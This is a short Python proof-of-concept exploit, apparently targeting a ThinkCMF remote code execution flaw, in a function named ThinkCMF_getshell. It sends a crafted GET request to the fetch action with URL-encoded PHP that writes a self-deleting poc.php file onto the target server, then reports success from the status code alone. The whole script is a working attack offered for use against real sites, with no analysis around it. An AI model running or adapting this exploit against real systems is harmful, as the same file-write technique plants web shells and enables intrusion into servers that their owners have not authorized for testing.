
import requests,sys,json

def ThinkCMF_getshell(url):
    if url[-1] == '/':
        url = url[0:-1]
    else:
        url = url
    vuln_url = url + '/index.php?a=fetch&content=%3C?php+file_put_contents(%22poc.php%22,%22%3C?php+echo+1017673059;unlink(__FILE__);%3B%22)%3B'
    r = requests.get(vuln_url)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200:
        print("Success: ", url+"/poc.php")
    else:
        print("No Exit ThinkCMF Vuln")


if __name__ == '__main__':
    if len(sys.argv) != 2:
        sys.exit("\n[+] python %s http://x.x.x.x/" % sys.argv[0])
    else:
        url = sys.argv[1]
        ThinkCMF_getshell(url)
